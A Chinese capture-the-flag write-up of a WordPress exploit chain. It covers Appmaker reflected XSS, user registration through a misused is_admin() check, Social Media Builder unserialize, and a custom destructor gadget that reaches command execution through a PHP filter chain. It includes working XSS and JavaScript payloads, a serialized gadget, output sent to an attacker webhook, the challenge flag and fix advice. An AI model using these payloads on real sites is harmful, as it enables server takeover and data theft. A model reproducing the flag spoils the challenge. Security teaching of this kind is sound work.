# NDWPP

## 题目简述

题目部署了 WordPress 6.6.1、WooCommerce、Appmaker WooCommerce Mobile App Manager、Social Media Builder，以及自定义插件 `A + Security`。管理员 bot 会访问任意符合 `^http(|s)://.*$` 的 URL，但不会预先登录；真正的 WordPress 管理员账号在容器启动时随机生成，也不会交给 bot。

flag 被改名为容器根目录下的随机 UUID 文件。完整利用链需要依次完成：

```text
Appmaker 反射型 XSS
  -> 在目标源执行脚本
  -> 滥用 is_admin() 注册普通用户
  -> Social Media Builder 任意反序列化
  -> APlusSecurity 析构 gadget
  -> load_template + PHP iconv filter chain 执行 PHP
```

这几个漏洞来自不同插件。Appmaker 负责 XSS，Social Media Builder 负责反序列化，自定义 `A + Security` 则提供最终对象注入 gadget，不能把三者混为一个漏洞。

## 解题过程

### 1. 用 Appmaker 参数取得同源脚本执行

Appmaker 在存在 `payment_from_app` 参数时注册 `hook_payment_footer()`。该函数把 `payment_gateway` 未经 JavaScript 转义就拼入脚本：

```php
$gateway = isset($_GET['payment_gateway'])
    ? $_GET['payment_gateway'] : '';

$output .= 'document.getElementById("payment_method_'
    . $gateway . '").checked = true;';
```

因此可以用以下值闭合原脚本标签：

```html
</script><script>eval(name)</script>
```

管理员 bot 首先访问攻击者页面。攻击者页面再通过 `window.open` 打开目标站点，并把真正的利用脚本放进新窗口的 `window.name`：

```javascript
const target = "http://127.0.0.1:8080";
const xss = "<\/script><script>eval(name)<\/script>";

open(
  target + "/?payment_from_app=1&payment_gateway=" + xss,
  "WEBHOOK='https://ATTACKER';(async()=>{/* 第二阶段 */})()"
);
```

`window.name` 会随跨源导航保留。目标页面中的注入脚本执行 `eval(name)` 后，第二阶段便运行在 WordPress 源下，可以读取页面 DOM、携带同源 Cookie 并请求仅允许 localhost 的接口。

### 2. 获取 nonce 并注册用户

自定义插件的注册逻辑看似要求两个条件：请求来自 localhost，且 `is_admin()` 为真：

```php
public function do_register()
{
    if (!$this->is_localhost()) {
        return "Registration is only allowed on localhost";
    }
    if (!is_admin()) {
        return "Only admin can register a user!";
    }
    // 验证 nonce 后调用 wp_create_user(...)
}
```

这里误解了 `is_admin()`：它只表示当前请求处于 WordPress 管理后台上下文，并不验证当前用户是否具有管理员权限。XSS 从 bot 浏览器访问 `127.0.0.1`，再选择 `/wp-admin/admin-post.php` 作为入口，就同时满足 localhost 和后台上下文两个检查。

先打开注册模板并读取隐藏 nonce：

```javascript
const win = open("/wp-admin/admin-post.php?login&register=1");
await new Promise(resolve => win.onload = resolve);

const nonce = win.document
  .querySelector('input[name="login_nonce"]')
  .value;
win.close();
```

随后在同一个浏览器会话中提交注册表单。`wp_create_user` 创建的是默认角色用户，但这已经足够，因为下一阶段的 AJAX action 只检查是否登录，没有检查 capability：

```javascript
const register = new FormData();
register.append("username", "randomuser12");
register.append("password", "randompass12");
register.append("email", "random@example.com");
register.append("action", "register");
register.append("login_nonce", nonce);

await fetch("/wp-admin/admin-post.php?login=1", {
  method: "POST",
  credentials: "include",
  body: register,
});
```

### 3. 触发任意 PHP 反序列化

Social Media Builder 注册了登录用户可用的 `wp_ajax_import_buttons`：

```php
public function importButtons()
{
    $url = $_POST['attachmentUrl'];
    $contents = unserialize(file_get_contents($url));
    foreach ($contents as $content) {
        // 导入按钮
    }
}
```

此处既没有 nonce 和权限检查，也允许攻击者控制传给 `file_get_contents` 的 URL。使用 `data:` URI 即可直接提交序列化数据，无需额外托管文件：

```javascript
const body = new FormData();
body.append(
  "attachmentUrl",
  "data:text/plain;base64," + SERIALIZED_OBJECT_BASE64
);

const response = await fetch(
  "/wp-admin/admin-ajax.php?action=import_buttons",
  { method: "POST", credentials: "include", body }
);
const result = await response.text();
```

`A + Security` 对非 localhost 的 `admin-ajax.php` 有额外封锁，而且要求登录；上述 XSS 会话同时满足这两个条件。

### 4. 构造 APlusSecurity gadget

目标类的危险析构函数如下：

```php
public function __destruct()
{
    $session_id = session_id();
    if (wp_verify_nonce(
        $this->user_nonce,
        'login_nonce_' . $session_id
    )) {
        if (isset($this->user_func) && isset($this->user_arg)) {
            return get_defined_functions()['user']
                [$this->user_func]($this->user_arg);
        }
    }
}
```

直接伪造 nonce 不可行，但 `__wakeup()` 会调用 `init()`，而 `init()` 会根据当前 session 生成一个新的合法 nonce 并写入 `$login_nonce`。在序列化对象中让 `$user_nonce` 引用 `$login_nonce`，后者被重写时前者会同步更新，析构检查自然通过：

```php
class APlusSecurity
{
    public $login_nonce = '';
    public $user_nonce = '';
    public $user_func = '';
    public $user_arg = '';
}

$payload = new APlusSecurity();
$payload->user_nonce =& $payload->login_nonce;
```

`get_defined_functions()['user']` 是按数字下标排列的用户定义函数数组。在题目固定环境中，下标 `805` 对应 WordPress 的 `load_template`，因此：

```php
$payload->user_func = '805'; // load_template
$payload->user_arg = $php_filter_uri;

echo base64_encode(serialize($payload));
```

生成结果的关键结构如下，其中 `R:2` 表示 `user_nonce` 引用第二个已序列化值，也就是 `login_nonce`：

```text
O:13:"APlusSecurity":4:{
  s:11:"login_nonce";s:0:"";
  s:10:"user_nonce";R:2;
  s:9:"user_func";s:3:"805";
  s:8:"user_arg";s:...:"php://filter/...";
}
```

函数下标依赖加载顺序，不能泛化到其他 WordPress 环境；本题附件和官方 PoC 均固定为 `805`。

### 5. 无落地文件执行 PHP

Web 根目录权限为只读，不能直接写入 WebShell。`load_template($path)` 会把参数当 PHP 模板包含，因此可令 `$user_arg` 指向 PHP filter chain。题目提供的 `chain.py` 会通过反复 iconv、Base64 编解码，在空的 `php://temp` 流前构造任意字节。

生成读取根目录文件的 PHP 代码：

```bash
python3 chain.py --chain "<?php system('cat /*');?>"
```

将输出的完整 `php://filter/.../resource=php://temp` URI 赋给 `$user_arg`，再序列化并 Base64 编码。官方载荷中的 filter URI 长 5259 字符；它只是上述生成器的机械输出，核心目标代码为 `<?php system('cat /*');?>`。

反序列化时发生以下过程：

1. `__wakeup()` 调用 `init()`，生成当前 session 的合法 nonce；
2. 引用关系让 `$user_nonce` 同步变成该 nonce；
3. 请求结束时 `__destruct()` 的校验通过；
4. 用户函数下标 `805` 调用 `load_template($php_filter_uri)`；
5. filter stream 生成 PHP 代码并被 include，`cat /*` 的输出进入 AJAX 响应；
6. XSS 脚本把响应内容发回攻击者的 webhook。

附件中的 flag 为：

```text
SEKAI{w0rdpr3ss_secur1ty_plugin_with_0_day_ch4in}
```

## 方法总结

本题不是单个 WordPress 漏洞，而是一条跨插件利用链。Appmaker 的输出编码错误提供同源 JavaScript 执行；`is_admin()` 的语义误用允许从后台入口注册普通用户；Social Media Builder 对 URL 内容直接 `unserialize` 提供对象注入；自定义类中的引用关系、`__wakeup` 和 `__destruct` 最终绕过 nonce 并调用任意已加载用户函数。

修复时应分别切断每一环：按 JavaScript 上下文编码输出；用 `current_user_can()` 检查权限而不是 `is_admin()`；AJAX action 同时校验 nonce 与 capability；禁止对远程或用户可控内容使用 `unserialize`，优先采用 JSON；避免在魔术方法中执行动态函数调用。PHP stream wrapper 和函数数字下标虽是题目中的后半段技巧，但前面的任意反序列化才是根本缺陷。
